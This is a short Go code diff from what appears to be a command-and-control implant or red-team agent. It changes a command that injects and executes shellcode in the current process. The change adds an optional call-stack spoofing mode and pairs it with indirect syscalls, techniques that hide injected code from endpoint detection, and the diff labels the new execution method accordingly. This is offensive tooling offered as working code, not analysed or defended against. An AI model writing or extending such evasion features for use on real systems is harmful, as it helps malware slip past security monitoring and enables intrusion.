@@ -55,6 +55,11 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 		}
 	}
 
+	if args.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
+	}
+
 	currentProcess := ^uintptr(0) // -1 = current process pseudohandle
 	method := "Standard"
 
@@ -80,7 +85,9 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 	}
 	injectCloseHandle(hThread)
 
-	if IndirectSyscallsAvailable() {
+	if args.StackSpoof && APISpoofAvailable() {
+		method = "Spoofed stack + indirect syscalls"
+	} else if IndirectSyscallsAvailable() {
 		method = "Indirect syscalls (calls from ntdll)"
 	}
 
